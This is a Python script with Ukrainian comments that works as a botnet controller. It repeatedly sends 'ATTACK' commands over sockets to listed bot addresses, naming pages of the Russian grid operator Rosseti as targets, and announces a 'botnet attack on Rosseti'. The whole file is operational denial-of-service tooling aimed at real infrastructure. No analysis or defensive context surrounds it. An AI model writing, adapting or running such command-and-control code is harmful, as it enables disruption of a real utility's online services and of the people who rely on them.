import requests
import threading
import time
import random
import socket
import signal

# Конфігурація
target_urls = [
    "https://rosseti.ru",
    "https://rosseti.ru/about",
    "https://rosseti.ru/contact"
]
bot_ips = ["192.168.1.14:5000"]  # Замініть на реальні IP:порт
proxies = {
    "http": "http://181.65.121.34:8080",
    "https": "https://181.65.121.34:8080"
}
running = True

def signal_handler(sig, frame):
    global running
    print(f"[{time.ctime()}] Отримав Ctrl+C, завершую...")
    running = False

def send_command(bot_ip):
    global running
    host, port = bot_ip.split(":")
    while running:
        target = random.choice(target_urls)
        command = f"ATTACK {target}"
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((host, int(port)))
                s.send(command.encode())
                response = s.recv(1024).decode()
                print(f"[{time.ctime()}] Відповідь від {bot_ip}: {response}")
        except Exception as e:
            print(f"[{time.ctime()}] Помилка з {bot_ip}: {e}")
        time.sleep(1)

def main():
    print(f"[{time.ctime()}] Розпочинаю ботnet-атаку на Россети...")
    threads = []
    for bot_ip in bot_ips:
        t = threading.Thread(target=send_command, args=(bot_ip,))
        t.daemon = False  # Змінено на False для коректного завершення
        threads.append(t)
        t.start()

    # Налаштування обробника сигналу
    signal.signal(signal.SIGINT, signal_handler)

    try:
        for t in threads:
            t.join()
    except:
        pass  # Ігноруємо винятки при примусовому завершенні

    print(f"[{time.ctime()}] Завершено.")

if __name__ == "__main__":
    main()
